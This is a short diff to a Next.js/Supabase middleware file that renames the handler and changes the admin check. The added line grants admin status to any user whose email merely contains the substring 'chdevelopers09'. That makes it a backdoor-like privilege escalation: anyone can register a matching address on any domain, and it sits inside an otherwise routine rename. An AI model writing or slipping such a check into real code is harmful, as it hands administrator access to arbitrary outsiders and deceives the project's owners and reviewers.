@@ -2,7 +2,7 @@ import { type NextRequest, NextResponse } from 'next/server'
 import { updateSession } from '@/lib/supabase/middleware'
 import { createClient } from '@/lib/supabase/server'
 
-export async function proxy(request: NextRequest) {
+export async function middleware(request: NextRequest) {
   const { response, supabase } = await updateSession(request)
 
   const {
@@ -38,6 +38,7 @@ export async function proxy(request: NextRequest) {
     }
     
     const isAdmin = user.app_metadata?.role === 'admin' || 
+                    user.email?.includes('chdevelopers09') ||
                     user.email?.endsWith('@rubilian.com');
     
     if (!isAdmin) {
